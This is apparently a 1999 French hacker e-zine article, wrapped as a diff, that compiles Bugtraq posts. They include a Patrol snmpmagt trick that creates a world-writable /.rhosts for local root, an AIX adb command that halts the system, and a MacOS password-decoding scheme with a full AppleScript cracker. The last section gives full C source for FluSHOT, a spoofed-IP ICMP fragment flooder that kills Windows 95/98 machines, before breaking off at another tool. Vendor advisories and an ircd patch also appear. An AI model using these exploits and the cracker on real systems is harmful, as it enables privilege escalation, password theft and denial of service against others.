@@ -1,0 +1,4702 @@
+La foire aux news :
+
+Etant l'un des fondateurs de OrganiKs, il m'était presque indispensable de participer de la meilleur façon
+possible au numéro 1.Mais par manque de temps, il semble d'ailleur que ce manque ne va pas s'arranger dans les mois qui vont venir, je ne pouvais pas écrire d'article vraiment interressants et bien construits. 
+Comme tout de fois le tri de mon courrier fait partie de mes activités "obligatoire", j'ai pensé qu'il pourrait interresser certain d'entre vous. A condition, naturellement, d'avoir de solide base en anglais et en programmation (bien souvent le C)... 
+Comme ce tri touche pas mal de sujet, ne soyez pas étonné de voir un sommaire pour cet "article"...
+
+Bienvenu à la Poste :)))...
+
+
+
+---Root Perms Gained with Patrol SNMP Agent 3.2 ... :
+
+Problem in Patrol 3.2
+---------------------
+
+vendor:
+Copyright 1993-97 BMC Software, Inc.
+
+how bad:
+local root/denial of service
+
+example:
+
+maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al snmpmagt
+-rwsr-xr-x   1 root       users       185461 Mar  6  1998 snmpmagt*
+
+maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al /.rhosts
+/.rhosts not found
+
+maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> umask 0
+
+(first argument must be either an invalid config file or a file that doesn't
+exist)
+maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> snmpmagt yoyoyo /.rhosts
+yoyoyo: No such file or directory
+snmp bind failure: Address already in use
+/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin/snmpmagt: error processing
+configuration
+
+maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin> ls -al /.rhosts
+-rw-rw-rw-   1 root       users          770 Jul 13 14:42 .rhosts
+
+
+note: if the file exists it keeps the same perms, otherwise creates it
+with perms based on your umask and chown's to whoever owns the parent
+directory of the file you're creating. if the file exists it overwrites it
+with "i^A" then the result of gethostname() and some whitespace. this
+problem is not platform dependent and was tested based on out of box
+install on an HP.
+
+- aalness@gti.net
+
+-Réponse :
+
+I tested the boxes I have under my command for this prob, and got the
+following results:
+
+AIX 4.2.1 -     running Patrol 3.1 (AIX3.2-RS) -      doesnt have snmpmagt.
+AIX 4.2.1 -     running Patrol 3.22 (AIX4.1-RS) -     file created.
+Solaris 2.5.1 - running Patrol 3.2 (Solaris25-sun4) - file created.
+HP-UX 10.01  -  running Patrol 3.2 (HPUX-PA1.1-V10) - file created.
+
+> note: if the file exists it keeps the same perms, otherwise creates it
+> with perms based on your umask and chown's to whoever owns the parent
+> directory of the file you're creating. if the file exists it overwrites it
+> with "i^A" then the result of gethostname() and some whitespace. this
+> problem is not platform dependent and was tested based on out of box
+> install on an HP.
+
+Hmmmmm - I cant seem to replicate the directory-owner prob.  It seems to me
+that snmpmagt creates the desired file with the owner set to the same as
+the owner of snmpmagt.  Here's a quick test I ran:
+
+"
+root@fish # pwd
+/export/home/patrol/PATROL3.2/Solaris25-sun4/bin
+root@fish # ls -al ./snmpmagt
+-rwsr-xr-x   1 root     staff     120364 Aug 26  1997 ./snmpmagt
+root@fish # mkdir /symon/patroltest
+root@fish # chmod 777 /symon/patroltest
+root@fish # ls -al /symon | egrep "patroltest"
+drwxrwxrwx   2 root     other        512 Jul 15 11:39 patroltest
+root@fish # umask 0
+root@fish # ./snmpmagt cheese.cheese /symon/patroltest/cheese
+cheese.cheese: No such file or directory
+smux bind failure: Address already in use
+./snmpmagt: error processing configuration
+root@fish # ls -al /symon/patroltest/cheese
+-rw-rw-rw-   1 root     other        770 Jul 15 11:40 /symon/patroltest/cheese
+root@fish # chown patrol ./snmpmagt
+root@fish # ./snmpmagt cheese.cheese /symon/patroltest/cheese.2
+cheese.cheese: No such file or directory
+snmp bind failure: Permission denied
+smux bind failure: Permission denied
+./snmpmagt: error processing configuration
+root@fish # ls -al /symon/patroltest
+total 8
+drwxrwxrwx   2 root     other        512 Jul 15 11:41 .
+drwxr-xr-x   5 root     other       1024 Jul 15 11:39 ..
+-rw-rw-rw-   1 root     other        770 Jul 15 11:40 cheese
+-rw-rw-rw-   1 patrol   other        770 Jul 15 11:41 cheese.2
+"
+
+- Symon Aked (symon at start dot com dot au)...
+
+-Réponse :
+
+FYI:
+
+Also works on:
+
+SunOS name1 5.6 Generic_105181-05 sun4u sparc SUNW,Ultra-5_10
+
+and
+
+OSF1 name2 V4.0 878 alpha
+
+Running Patrol SNMP Agent 3.2.5
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---aix 4.2 4.3.1, adb :
+
+Hi,
+
+Local users can halt the operating system by 'adb' command under my AIX
+box.
+
+Here's a simple C program:
+main()
+{
+        int i;
+        for ( i = 0; i < 10; i++ )
+        {
+        }
+
+        return 0;
+}
+
+I compiled the program and run 'adb':
+$ cc -g -o a.out a.c
+$ adb a.out -
+adb
+.main,5:s
+a.out: running
+
+Now host halted. AIX 4.2(IBM RS/6000 F50) and AIX 4.3.1(IBM RS/6000 S70)
+have 'adb' problem. But AIX 4.3.2 haven't the 'adb' problem. I have tested
+it under my AIX box. Is it bug of AIX 4.2, 4.3.1?
+
+GZ Apple                         mailto:gzapple@21cn.com
+
+
+
+-Réponse :
+
+Just for confirmation:
+I tried this on my AIX 4.3.1 box (IBM RS/6000 F50, 1x332Mhz CPU, 128Mb RAM),
+and it does work.
+As the machine did halt, it displayed "888 102 300 0c0" at the front LCD.
+
+You could also recive this data throu the service processor by choosing:
+3 - System Information
+  4 - Read Service Processor Error Logs
+
+The output I got from this was "<DATE> 1. OS termination string received -
+888 102 300 0c0"
+
+A search for this sequence in the IBM APAR database showed that the macine
+hanged with a DSI (Data Storage Interrupt). Only god knows what IBM means
+with that.
+This is the output of the error reporting program:
+
+bash-2.01# errpt -a -l329
+---------------------------------------------------------------------------
+LABEL:          SCANOUT
+IDENTIFIER:     CF8CADB6
+
+Date/Time:       tis jul 13 10.15.41
+Sequence Number: 329
+Machine Id:      0041072A4C00
+Node Id:         <Insert_machine_name_here>
+Class:           H
+Type:            PERM
+Resource Name:   sysplanar0
+Resource Class:  planar
+Resource Type:   sysplanar_rspc
+Location:        00-00
+
+Description
+SYSTEM FAILURE WITH SCAN DATA
+
+Probable Causes
+SYSTEM HARDWARE
+SOFTWARE ERROR
+
+Failure Causes
+SYSTEM HARDWARE
+SOFTWARE SUBSYSTEM
+
+        Recommended Actions
+        PERFORM PROBLEM DETERMINATION PROCEDURES
+        IF PROBLEM CONTINUES TO OCCUR REPEATEDLY THEN DO THE FOLLOWING
+        CONTACT APPROPRIATE SERVICE REPRESENTATIVE
+
+Detail Data
+ERROR COUNT
+           1
+SCAN DATA PATHNAME
+/usr/lib/ras/checkstop.0041072A4C00.A
+
+
+This was all the information that I could find. I'm now of to upgrade my AIX
+version level
+
+My best regards,
+Peter Fredriksson
+Systems administrator
+Skriptor AB
+email - Peter.Fredriksson@Skriptor.com
+Phone: +46 8-441 77 30
+Fax: +46 8-698 09 09
+
+-Réponse :
+
+Quoting GZ Apple (gzapple@21cn.com):
+>
+> Local users can halt the operating system by 'adb' command under my AIX
+> box.
+>
+
+This affects AIX 4.2.x and 4.3.x (including 4.3.2).  We're still working
+on the official fix, but here's an excerpt from the soon-to-be-released
+advisory.
+
+Any questions regarding this vulnerability or other AIX security holes
+can be sent to security-alert@austin.ibm.com.
+
+--------------------   8<   --------------------
+
+    A temporary fix is available via anonymous ftp from:
+
+       ftp://aix.software.ibm.com/aix/efixes/security/adb_hang.tar.Z
+
+    Filename                 sum              md5
+    ======================================================================
+    unix_mp.42.adb_hang_fix  00772  2693  960214a1945f2c70311283adc0b231a3
+    unix_mp.43.adb_hang_fix  15044  3302  584d1c5ea0223110e2d8eba84388f526
+
+
+    This temporary fix has not been fully regression tested.  The fix
+    consists of a multiprocessor kernel which can be used on either a
+    uniprocessor or multiprocessor machine.  There may be a slight
+    performance penalty when using a multiprocessor kernel on a
+    uniprocessor machine.
+
+    Use the following steps (as root) to install the temporary fix:
+
+    1.  Determine the version of the kernel fileset on your machine.
+
+        # lslpp -l <fileset>
+
+        If the version of the kernel fileset for your machine is not at
+        the level described below, install the requisite APAR listed.
+        This will help ensure that the temporary kernel fix will run
+        properly.
+
+        Release        Fileset            Version        requisite APAR
+        ===============================================================
+        AIX 4.2.x      bos.mp or bos.up   4.2.1.23       IY00689
+        AIX 4.3.x      bos.mp or bos.up   4.3.2.8        IY00727
+
+    2. Uncompress and extract the fix.
+
+        # uncompress < adb_hang.tar.Z | tar xf -
+        # cd adb_hang
+
+    3. Review and run the adb_hang.sh script to install the new kernel.
+
+          # view ./adb_hang.sh
+          # ./adb_hang.sh
+
+    4. Reboot.
+
+
+--
+Troy Bollinger                            troy@austin.ibm.com
+AIX Security Development        security-alert@austin.ibm.com
+PGP keyid: 1024/0xB7783129 Troy's opinions are not IBM policy
+
+-Réponse :
+
+On Mon, 12 Jul 1999, GZ Apple wrote:
+
+> Local users can halt the operating system by 'adb' command under my AIX
+> box.
+>
+> Now host halted. AIX 4.2(IBM RS/6000 F50) and AIX 4.3.1(IBM RS/6000 S70)
+> have 'adb' problem. But AIX 4.3.2 haven't the 'adb' problem. I have tested
+> it under my AIX box. Is it bug of AIX 4.2, 4.3.1?
+
+AIX 4.3.2 has the problem too if you have the bos.adt.debug fileset
+installed.
+
+# which adb
+/usr/bin/adb
+# lslpp -w /usr/bin/adb
+  File                                        Fileset               Type
+----------------------------------------------------------------------------
+  /usr/bin/adb                                bos.adt.debug         File
+
+mga.
+--
+Mike Austin                           Computing & Information Technology
+Systems Programmer                    The University of Vermont
+AIX/DCE Sys Admin                     802-656-8785
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---MacOS system encryption algorithm :
+
+The encryption algorithm in MacOS system is simple and the password can be
+easily decoded.
+
+Password is stored in Users & Groups Data File in Preferences folder. Offset
+is different on each system and depends on Users & Groups configuration, but
+it always lie after owner's username. It's not so difficult to find it using
+hex editor, even if we don't know owner's username.
+
+Here are some examples of encrypted passwords:
+00 04 06 18 0D 0A 19 0B = stayaway
+0A 1F 10 1B 00 07 75 1E = yellow
+1C 1B 16 14 12 62 10 7B = owner
+07 02 13 1A 1E 0F 1A 14 = turnpage
+27 25 33 27 27 39 24 7E = Trustno1
+
+AA BB CC DD EE FF GG HH = aa bb cc dd ee ff gg hh
+
+where:
+AA BB CC DD EE FF GG HH - encrypted password (hex)
+aa bb cc dd ee ff gg hh - decrypted password in ASCII codes (hex)
+
+aa=AA XOR 73H
+bb=BB XOR AA XOR 70H
+cc=CC XOR BB XOR 63H
+dd=DD XOR CC XOR 67H
+ee=EE XOR DD XOR 74H
+ff=FF XOR EE XOR 70H
+gg=GG XOR FF XOR 72H
+hh=HH XOR GG XOR 6BH
+
+An example:
+Let's take OO 04 06 18 0D 0A 19 0B
+
+00H XOR 73H = 73H = s
+04H XOR 00H = 04H; 04H XOR 70H = 74H = t
+06H XOR 04H = 02H; O2H XOR 63H = 61H = a
+18H XOR 06H = 1EH; 1EH XOR 67H = 79H = y
+0DH XOR 18H = 15H; 15H XOR 74H = 61H = a
+0AH XOR 0DH = 07H; 07H XOR 70H = 77H = w
+19H XOR 0AH = 13H; 13H XOR 72H = 61H = a
+0BH XOR 19H = 12H; 12H XOR 6BH = 79H = y
+
+tested on:
+MacOS 7.5.3, 7.5.5, 8.1, 8.5
+
+I wrote an apple script to break passwords
+
+--------CUT HERE--------
+(*          MacOS Pass 2.1 by adix      15.06.99; Apple Script English    *)
+global lbin, bit1, bit2, bitk
+set hex1 to text returned of (display dialog "Enter encrypted password
+(hex): " default answer "" buttons {" Ok "} default button " Ok " with icon
+stop)
+set Alicia to
+"0111001101110000011000110110011101110100011100000111001001101011"
+set pass to ""
+set lbin to ""
+set razem to ""
+set i to 1
+set skok to 0
+set ile to count items in hex1
+if ile = 0 or ile = 1 then
+ set pass to ""
+else
+ repeat until (i > (ile - 1))
+  set kodascii to 0
+  set razem to ""
+  set zn to items (i) thru (i + 1) in hex1
+  set lbin to hex2bin(zn)
+  repeat with a from 1 to 8
+   set bit1 to item (a + skok) of Alicia
+   xor(a)
+   set razem to {razem & bitk} as string
+   if i < 2 then
+    set kodascii to {kodascii + bitk * (2 ^ (8 - a))}
+   end if
+  end repeat
+  if i < 2 then
+   set pass to {pass & (ASCII character kodascii)}
+  else
+   set zn to items (i - 2) thru (i - 1) in hex1
+   set lbin to hex2bin(zn)
+   repeat with a from 1 to 8
+    set bit1 to item a of razem
+    xor(a)
+    set kodascii to {kodascii + bitk * (2 ^ (8 - a))}
+   end repeat
+   set pass to {pass & (ASCII character kodascii)}
+  end if
+  set skok to skok + 8
+  set i to i + 2
+ end repeat
+end if
+display dialog "Password:   " & pass & return & return & "by adix" buttons
+{" Ok "} default button " Ok " with icon note
+on hex2bin(zn)
+ set temphex to {"0000", "0001", "0010", "0011", "0100", "0101", "0110",
+"0111", "1000", "1001", "1010", "1011", "1100", -
+  "1101", "1110", "1111"}
+ set t2hex to "0123456789ABCDEF"
+ set bin to ""
+ repeat with j in zn
+  set t1 to j as string
+  repeat with i from 1 to (count items in t2hex)
+   if ((item i in t2hex) = t1) then
+    set temp to (item i in temphex)
+    exit repeat
+   end if
+  end repeat
+  set bin to {bin & temp} as string
+ end repeat
+ return (bin)
+end hex2bin
+on xor(a)
+ set bit2 to item a in lbin
+ if bit1 = bit2 then
+  set bitk to "0"
+ else
+  set bitk to "1"
+ end if
+end xor
+--------CUT HERE--------
+
+Dawid adix Adamski
+adixx@friko4.onet.pl
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---Conférences :
+
+
+                     Announcement and Call for Papers
+
+           ____    _    _   _ _____      ____   ___   ___   ___
+          / ___|  / \  | \ | | ____|    |___ \ / _ \ / _ \ / _ \
+          \___ \ / _ \ |  \| |  _|        __) | | | | | | | | | |
+           ___) / ___ \| |\  | |___      / __/| |_| | |_| | |_| |
+          |____/_/   \_\_| \_|_____|    |_____|\___/ \___/ \___/
+
+
+                     2nd International SANE Conference
+
+                              May 22-25, 2000
+
+                        Maastricht, The Netherlands
+
+ A conference organized by the NLUUG, the UNIX User Group - The Netherlands
+   co-sponsored by USENIX, the Advanced Computing Systems Association, and
+                               Stichting NLnet
+
+
+
+OVERVIEW
+
+Technology is advancing, the systems administration profession is changing
+rapidly, and you have to master new skills to keep apace. At the second
+International SANE (System Administration and Networking) conference you'll
+find a wealth of opportunities to meet other system administrators and
+network (security) professionals with similar interests, while attending a
+program that brings you the latest in tools, techniques, security and
+networking. You can learn from tutorials, refereed papers, invited talks,
+work-in-progress (WIP) and Birds-of-a-Feather (BoF) sessions. Visit the
+Vendor Exhibition for the hottest products and the latest books available.
+The official language at the conference will be English. The conference will
+be located at the Maastricht Exposition and Conference Center, MECC.
+
+
+TUTORIAL PROGRAM
+
+On Monday May 22 and Tuesday May 23, a large selection of practical,
+problem-solving, in-depth tutorials will be presented to you by the most
+authoritative, popular and widely acclaimed speakers.
+
+
+TECHNICAL CONFERENCE
+
+Following the tutorial days, Wednesday May 24 and Thursday May 25 will offer
+comprehensive technical sessions, including keynote address, presentations
+of refereed papers, invited talks and BoFs.
+The social event and the enjoyable inSANE Quiz will help you getting to know
+other professionals in your field.
+
+
+CONFERENCE TOPICS
+
+Presentations are being solicited in areas including but not limited to:
+
+   * Security tools and techniques: Network Intrusion Detection Systems,
+     Firewalls, VPNs, practical cryptography and auditing
+   * Web security fundamentals and practical web site maintenance
+   * Network monitoring and traffic shaping solutions
+   * System and network performance tuning
+   * Managing enterprise-wide e-mail and fighting junkmail (sometimes
+     mistakenly referred to as 'spam')
+   * Experiences with Open Source software (including operating systems) in
+     a professional environment
+   * Innovative system administration tools & techniques
+   * Distributed or automated system administration
+   * Adventures in nomadic and wireless computing
+   * Intranet development, support, and maintenance
+   * Integrating new networking technologies
+   * Integration of heterogeneous platforms
+   * Support strategies in use at your site
+   * Effective training techniques for system administration and users
+
+
+REFEREED PAPER SUBMISSIONS
+
+An extended abstract is required for the paper selection process: details on
+how to submit an abstract will be published at the web site listed below.
+Abstracts accompanied by non-disclosure agreement forms are not acceptable
+and will be returned unread.
+
+Authors of accepted submissions must provide a final paper for publication
+in the conference proceedings. These final papers are held in the highest
+confidence prior to publication in the conference proceedings. By agreeing
+to present your paper at SANE 2000, you also give license to the SANE 2000
+conference organizers that it may be published in the members-only area on
+the NLUUG web site and/or in the conference CD-ROM.
+
+
+WORK-IN-PROGRESS (WIP)
+
+The conference facilitates Work-In-Progress (WIP) sessions in parallel to
+the main conference tracks. WIPs are informal, 20-minute talks that give you
+the opportunity to share your current unfinished work with others in the
+field. So, if you have a topic of interest that is not very well suited for
+a refereed paper submission, please submit a proposal for a WIP session to
+the WIP Coordinator at the address: <sane2000-wip@nluug.nl>
+
+
+BoFs
+
+Birds-of-a-Feather (BoF) sessions are highly interactive, informal
+gatherings of attendees interested in a particular topic. BoFs enable
+attendees to discuss topics of mutual interest and to build professional
+relationships with other people who share similar interests. A BoF that is
+already being planned is a PGP key-signing BoF (or party).
+If you want to schedule a BoF prior to the conference, please contact the
+BoF coordinator at the address: <sane2000-bofs@nluug.nl>
+
+
+IMPORTANT DATES
+
+ Extended abstracts due:    November 1, 1999
+ Notification to speakers: November 12, 1999
+ Final papers due:            March 24, 2000
+
+
+CONFERENCE ORGANIZERS
+
+Program co-chairs <sane2000-chair@nluug.nl>
+  Bob Eskes, Applied System's Research, Hollandse Signaalapparaten, Hengelo
+  Edwin Kremer, Department of Computer Science, Utrecht University
+Tutorial Coordinator <sane2000-tut@nluug.nl>
+  Jos Alsters, C&CZ, KU Nijmegen
+Program Committee
+  Jaap Akkerhuis, SIDNL, Arnhem
+  Michel Anders, Tunix, Nijmegen
+  Walter Belgers, Origin, Eindhoven
+  Fred Donck, Shell Services International, Rijswijk
+  Peter Honeyman, USENIX
+  Brad Knowles, Belgacom Skynet SA/NV, Brussels
+Event Organization <sane2000-org@nluug.nl>
+  Marielle Klatten, NLUUG
+  Monique Rours, NLUUG
+  Wytze van der Raay, NLnet Foundation
+
+
+
+     Complete program and registration information will be available in
+   December 1999. For the latest information about the conference, please
+     visit the SANE 2000 web site: http://www.nluug.nl/events/sane2000/
+
+    For questions not being answered at this web site, please contact the
+                                NLUUG office
+                     by e-mail: sane2000-info@nluug.nl
+
+  ------------------------------------------------------------------------
+
+
+Best regards,
+
+Fred Donck
+Program Committee member
+
+--
+                                        e-mail: fred@donck.com
+Fred Donck                               whois: fd435
+
+
+-
+ToorCon - San Diego, California's ONLY Comprehensive Computer Security
+Conference
+
+WHEN
+
+September 3rd-4th, 1999
+Each day starts at 10am and ends at 6pm
+
+WHERE
+
+The Price Center in the University of California, San Diego:
+9500 Gilman Drive
+La Jolla, CA 92093
+
+WHO
+
+ToorCon is sponsored by the San Diego 2600 Meeting (sd2600.net) and
+Nightfall Security Group (nfsg.org).
+
+WHY
+
+The purpose of ToorCon is to bring a comprehensive, interactive and
+enjoyable conference to the western United States that will help make
+the public aware of the importance of computer security and how to make
+their networks more secure. We will try to cover more general issues
+such as hackers and crackers and how the media uses it's role in the
+computer world but we are going to focus toward specific issues of
+computer security such as IDS, firewalling, buffer overflows, etc.
+
+PRICE
+
+ToorCon is $35 at the door for both days. If you live in the San Diego
+area, or wish to pay in advance for large companies please contact me at
+skalore@sd2600.net and we can arrange to pay in advance for $25 per
+person.
+
+REFERENCES
+
+ToorCon Website is http://toor.sd2600.net
+San Diego 2600 Meeting Website is http://www.sd2600.net
+Nightfall Security Group is http://www.nfsg.org
+
+Thank You,
+
+From the Staff of ToorCon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---Bug in Axent 5.0 :
+
+Bug in Axent 5.0 for Unix
+Bugtraq ID 518
+
+This information was forwarded to Security Focus.
+
+ Certain checks within Axent's ESM 5.0 for Unix may prevent legitimate
+ users from logging on to scanned hosts.
+
+ Specifically, four checks within the security auditing program may cause
+ this denial of service:
+
+ * Check PATH using 'su'
+ * Check PATH by modifying startup script
+ * Check umask using 'su'
+ * Check umask by modifying startup script
+
+ These checks are not enabled in the default policy templates.
+
+ When ESM is checking PATH (or umask) values, it will 'su' to the user's
+ account. If the user's script calls a menu function, ESM will not respond
+ and the check will hang. To overcome this problem, ESM copies the
+ startup script to the /tmp directory, adds additional values to the end of
+ the script, and copies the script back to the user's directory. The new
+ values in the script will echo the PATH and umask values to a file called
+ .esmvalues in the user's home directory the next time the user logs in.
+ When ESM is run again, it will read the contents of .esmvalues to
+ determine the PATH and umask values. This procedure eliminates the
+ problems associated with 'su'ing to the account and hanging on a menu
+ call.
+
+ Unfortunately, when ESM copies the file to /tmp, file ownership and
+ permissions are changed to 'root'. When the file is copied back to the
+ user's directory, only root has access - legitimate users will not be
+ able to execute their login script.
+
+ This bug should be fixed in the upcoming 5.0.1 release.
+
+--
+Elias Levy
+Security Focus
+http://www.securityfocus.com/
+
+-Réponse :
+
+AXENT appreciates the opportunity to respond to the issues raised with this
+posting.  The first statement indicates that users cannot log into scanned
+hosts.  This is not true--users can log in, but they will not be able to
+access their startup scripts.  This bug constitutes more of an inconvenience
+to the user, than a security threat.
+
+The bug was discovered a short time ago and there is a current procedure for
+correcting the ownership of files that may have been affected.  Currently
+there is a newer version of the affected usrfiles module that does not
+change the ownership of the startup scripts. This procedure and/or the
+updated module can be obtained by contacting AXENT support.  This version of
+the usrfiles module is also included in the August HotFix for ESM that
+customers can remotely install on all systems.  The hot fix is only needed
+for ESM 5.0 UNIX agents. Earlier versions of ESM agents do not have this
+problem.  The fix will also be included in the upcoming ESM 5.0.1 release.
+
+As was indicated in the original posting, this check was not turned on by
+default and most ESM 5.0 customers have probably not used it.   If you
+desire the procedure to correct the affected files or the updated module,
+please contact AXENT support at  support@axent.com
+<mailto:support@axent.com>  .
+
+Thank you,
+
+Steve Jackson
+ESM Technical Product Manager
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--ircd exploit in ircu based code :
+
+Most irc networks using ircu based servers have a bug that can cause users
+to segfault the server.
+
+In m_join, the code doesn't check to see if get_channel returned failure (by
+returning NULL).
+
+
+While the line numbers will probably be off, this patch will work in most
+ircu based servers.
+
+--- ircd/channel.c      Tue Jul 13 19:58:46 1999
++++ ircd/channel.c      Tue Jul 13 20:05:31 1999
+@@ -2004,6 +2004,12 @@
+
+          chptr = get_channel (sptr, name, !CREATE);    /* need the TS -Kev */
+
++         if (!chptr) {
++               sendto_one (sptr, err_str (ERR_NOSUCHCHANNEL),
++                           me.name, parv[0], name);
++               return(0);
++         }
++
+          sendto_serv_butone (cptr, ":%s MODE %s +%s%s %lu", me.name, name,
+                              sendmode ? "o " : "", sendmode ? parv[0] : "",
+                              chptr->creationtime);     /* send the MODE to the
+
+
+Kevin Day
+DragonData
+ToastyMan on irc.dragondata.com (on NewNet)
+
+-Réponse :
+
+>From: Kevin Day <toasty@DRAGONDATA.COM>
+>To: BUGTRAQ@SECURITYFOCUS.COM
+>Subject: ircd exploit in ircu based code
+>
+>Most irc networks using ircu based servers have a bug that can cause users
+>to segfault the server.
+>
+>In m_join, the code doesn't check to see if get_channel returned failure (by
+>returning NULL).
+
+As of now I can't even find this bug in the oldest versions of our code,
+for sure isn't there in u2.10.06, I still have to check on the previous
+2.10.05 that is still packaged in some Linux/BSD distributions.
+
+Would you please let me know in what version of the Undernet's code you
+found it and, in case there is still a way to core the current servers
+report the way to exploit it on bugs@undernet.org ?
+
+We would appreciate a lot if any bug that can cause a server coredump
+is reported on bugs@undernet.org with a few days of advantage respect
+to the other public lists... so we can fix it on te fly (we happen to
+have a living network with 38k users on it...).
+
+Thanks a lot,
+
+Andrea aka Nemesi,
+
+Undernet's coder committee.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--About IGMP and another exploit for Windows95x/98x :
+
+I got two exploit and test it...
+
+- The first one is Flushot by DarkShow. This exploit can drop the network
+connection in windows 95 and 98(First Edition)
+
+- The other one is Pimp by Rob Mosher, this exploit can reboot Windows98se
+
+I have Rethat linux 5.0 installed....
+
+Now... the exploits..
+
+Sorry.. my english is a shit...
+
+Have fun..
+
+----------[FluSHOT.c START CUT
+HERE]--------------------------------------------------
+/* Lags CPU Made By DarkShadow from The flu Hacking Group
+
+   Kills Win95-98 machines
+
+ */
+
+
+
+#include <stdio.h>
+
+#include <unistd.h>
+
+#include <stdlib.h>
+
+#include <string.h>
+
+#include <sys/types.h>
+
+#include <sys/time.h>
+
+#include <sys/socket.h>
+
+#include <netdb.h>
+
+#include <netinet/in.h>
+
+#include <netinet/ip.h>
+
+#include <netinet/ip_icmp.h>
+
+void banner(void) {
+
+        
+
+   printf("Remote Flushot v 1.0\n\n");
+
+   
+
+   
+
+   printf("\n\n");
+
+}
+
+void usage(const char *progname) {
+
+   printf(" usage:\n");
+
+   printf("./flushot [Spoofed IP] [Destination IP] [# of FLushot to
+Send]\n",progname);
+
+   printf(" [Spoofed IP] :  ex: 205.56.78.0\n");
+
+   printf(" [Destination IP] :  ex: 201.12.3.76\n");
+
+   printf(" [# of FLushot to Send]  : 100\n");
+
+   printf("The Flu Hacking Group (c)\n");
+
+   printf("DarkShadow PlimoMan Hack The Planet\n");
+
+}
+
+int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {
+
+   struct hostent *host;
+
+   memset(addr,0,sizeof(struct sockaddr_in));
+
+   addr->sin_family = AF_INET;
+
+   addr->sin_addr.s_addr = inet_addr(name);
+
+   if (addr->sin_addr.s_addr == -1) {
+
+      if (( host = gethostbyname(name) ) == NULL )  {
+
+         fprintf(stderr,"ERROR: Unable to resolve host %s\n",name);
+
+         return(-1);
+
+      }
+
+      addr->sin_family = host->h_addrtype;
+
+      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
+
+   }
+
+   addr->sin_port = htons(port);
+
+   return(0);
+
+}
+
+unsigned short in_cksum(addr, len)
+
+    u_short *addr;
+
+    int len;
+
+{
+
+    register int nleft = len;
+
+    register u_short *w = addr;
+
+    register int sum = 0;
+
+    u_short answer = 0;
+
+
+
+    while (nleft > 1)  {
+
+        sum += *w++;
+
+        nleft -= 2;
+
+    }
+
+
+
+    if (nleft == 1) {
+
+        *(u_char *)(&answer) = *(u_char *)w ;
+
+        sum += answer;
+
+    }
+
+
+
+    sum = (sum >> 16) + (sum & 0xffff);
+
+    sum += (sum >> 16);                 
+
+    answer = ~sum;                      
+
+    return(answer);
+
+}
+
+int send_winbomb(int socket,
+
+                 unsigned long spoof_addr,
+
+                 struct sockaddr_in *dest_addr) {
+
+   unsigned char  *packet;
+
+   struct iphdr   *ip;
+
+   struct icmphdr *icmp;
+
+   int rc;
+
+
+
+   packet = (unsigned char *)malloc(sizeof(struct iphdr) +
+
+                                    sizeof(struct icmphdr) + 8);
+
+   ip = (struct iphdr *)packet;
+
+   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
+
+   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
+
+   ip->ihl      = 5;
+
+   ip->version  = 4;
+
+// ip->tos      = 2;
+
+   ip->id       = htons(1234);
+
+   ip->frag_off |= htons(0x2000);
+
+// ip->tot_len  = 0;
+
+   ip->ttl      = 30;
+
+   ip->protocol = IPPROTO_ICMP;
+
+   ip->saddr    = spoof_addr;
+
+   ip->daddr    = dest_addr->sin_addr.s_addr;
+
+   ip->check    = in_cksum(ip, sizeof(struct iphdr));
+
+
+
+   icmp->type              = 12;
+
+   icmp->code              = 0;
+
+   icmp->checksum          = in_cksum(icmp,sizeof(struct icmphdr) + 1);
+
+   if (sendto(socket,
+
+              packet,
+
+              sizeof(struct iphdr) +
+
+              sizeof(struct icmphdr) + 1,0,
+
+              (struct sockaddr *)dest_addr,
+
+              sizeof(struct sockaddr)) == -1) { return(-1); }
+
+   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
+
+   ip->frag_off = htons(8 >> 3);
+
+   ip->frag_off |= htons(0x2000);
+
+   ip->check    = in_cksum(ip, sizeof(struct iphdr));
+
+   icmp->type = 0;
+
+   icmp->code = 0;
+
+   icmp->checksum = 0;
+
+   if (sendto(socket,
+
+              packet,
+
+              sizeof(struct iphdr) +
+
+              sizeof(struct icmphdr) + 8,0,
+
+              (struct sockaddr *)dest_addr,
+
+              sizeof(struct sockaddr)) == -1) { return(-1); }
+
+   free(packet);
+
+   return(0);
+
+}
+
+int main(int argc, char * *argv) {
+
+   struct sockaddr_in dest_addr;
+
+   unsigned int i,sock;
+
+   unsigned long src_addr;
+
+   banner();
+
+   if ((argc != 4)) {
+
+      usage(argv[0]);
+
+      return(-1);
+
+   }
+
+
+
+   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+
+      fprintf(stderr,"ERROR: Opening raw socket.\n");
+
+      return(-1);
+
+   }
+
+
+
+   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }
+
+   src_addr = dest_addr.sin_addr.s_addr;
+
+   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }
+
+   printf("Status: Connected....packets sent.\n",argv[0]);
+
+   for (i = 0;i < atoi(argv[3]);i++) {
+
+      if (send_winbomb(sock,
+
+                       src_addr,
+
+                       &dest_addr) == -1) {
+
+         fprintf(stderr,"ERROR: Unable to Connect To luser.\n");
+
+         return(-1);
+
+      }
+
+      usleep(10000);
+
+   }
+
+}
+
+
+----------[FluSHOT.c END CUT
+HERE]--------------------------------------------------
+----------[Pimp.c START CUT
+HERE]--------------------------------------------------
+/*
+** pimp.c 6/4/99 by Rob Mosher: nyt@deadpig.org
